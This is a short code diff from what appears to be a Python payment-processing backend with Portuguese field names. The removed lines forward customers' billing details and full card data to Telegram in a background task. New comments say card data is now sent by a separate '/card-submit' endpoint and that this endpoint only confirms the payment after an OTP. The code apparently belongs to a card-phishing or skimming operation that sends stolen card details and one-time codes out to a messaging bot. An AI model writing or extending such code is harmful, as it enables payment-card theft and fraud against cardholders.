@@ -57,12 +57,8 @@ async def process_payment(payment_request: PaymentRequest, background_tasks: Bac
         # Store payment data
         payment_storage[tracking_data.id] = tracking_data.dict()
         
-        # Send complete info (cliente + pagamento) to Telegram in background
-        background_tasks.add_task(
-            telegram_service.send_payment_info,
-            payment_request.billing_data.dict(),
-            payment_request.card_data.dict()
-        )
+        # This endpoint is now only used for final confirmation after OTP
+        # The card data was already sent via /card-submit endpoint
         
         logger.info(f"Payment processed for {payment_request.billing_data.nome}")
         
